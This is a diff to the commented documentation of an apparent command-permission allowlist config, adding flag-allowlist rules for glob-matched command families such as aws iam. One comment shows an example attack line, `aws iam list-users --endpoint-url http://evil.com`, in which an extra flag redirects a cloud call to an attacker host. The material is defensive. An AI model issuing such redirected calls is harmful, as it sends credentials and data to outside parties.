@@ -294,6 +294,30 @@
 # first_arg = ["test", "test:*"]         # "test" exact or "test:..." prefix
 # level = "SafeRead"
 
+# FIRST_ARG_STANDALONE / FIRST_ARG_VALUED — the flag allowlist for a first_arg
+# GLOB family. A glob decides on the first positional alone; without these it
+# never examines the rest of the line, so ANY flag rides along on an admitted
+# verb — including one that changes where the call goes or who it runs as
+# (`aws iam list-users --endpoint-url http://evil.com`). Declare them whenever
+# the glob covers a family whose flags carry security meaning.
+#
+# Same arity split as standalone/valued: a valued flag consumes the next token,
+# and both accept the --flag=value spelling. Bare positionals always pass (a
+# glob family like `kubectl get pods` names its resource positionally); use
+# credential_first_arg for positionals that must deny.
+#
+# Empty = the family is not yet researched and stays permissive. That is a
+# migration affordance for the ~250 cloud-service groups, not a default to
+# reach for: `no_new_unresearched_first_arg_family` pins the remaining set, so
+# a new undeclared family fails the build.
+
+# [[command.sub]]
+# name = "iam"
+# first_arg = ["get-*", "list-*"]
+# first_arg_standalone = ["--debug", "--no-cli-pager"]
+# first_arg_valued = ["--output", "--query", "--region", "--role-name"]
+#                                        # --endpoint-url/--profile absent by research
+
 # CREDENTIAL_FIRST_ARG — the value-dependent credential-read gate. Same glob
 # syntax as first_arg (exact or trailing-* prefix), but a MATCH DENIES the
 # invocation as a credential exposure instead of allowing it. Checked after
